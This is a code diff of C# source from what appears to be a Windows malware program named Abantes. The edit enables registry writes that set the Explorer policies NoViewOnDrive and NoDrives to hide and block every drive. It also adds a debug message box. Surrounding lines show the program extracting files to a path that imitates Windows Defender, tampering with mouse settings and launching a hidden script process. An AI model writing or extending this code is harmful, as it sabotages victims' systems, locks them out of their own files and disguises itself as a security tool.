@@ -30,7 +30,7 @@ namespace Abantes
 
             if (Process.GetProcessesByName("Abantes").Count() > 1) { Environment.Exit(0); }
 
-            if (Registry.GetValue(@"HKEY_LOCAL_MACHINE\Software\Abantes", "Debug", null) == null) { } else { Mode = 1; }
+            if (Registry.GetValue(@"HKEY_LOCAL_MACHINE\Software\Abantes", "Debug", null) == null) { } else { MessageBox.Show("DEBUG MODE ENABLED", "DEBUG", 0, 0); Mode = 1; }
 
             RegistryKey editKey;
             string extractPath = @"C:\Windows\Defender";
@@ -207,12 +207,12 @@ namespace Abantes
                 editKey.SetValue("MouseTrails", "7");
                 editKey.Close();
 
-                //editKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");    Causes Crash
-                //editKey.SetValue("NoViewOnDrive", new byte[] { 67, 10, 88, 63 }, RegistryValueKind.DWord);
-                //editKey.Close();
-                //editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");   Causes CrashW
-                //editKey.SetValue("NoDrives", new byte[] { 67, 10, 88, 63 }, RegistryValueKind.DWord);
-                //editKey.Close();
+                editKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");    //Causes Crash
+                editKey.SetValue("NoViewOnDrive", 67108863, RegistryValueKind.DWord);
+                editKey.Close();
+                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");   //Causes CrashW
+                editKey.SetValue("NoDrives", 67108863, RegistryValueKind.DWord);
+                editKey.Close();
 
                 Process ScriptProcess = new Process();
                 ScriptProcess.StartInfo.CreateNoWindow = true;
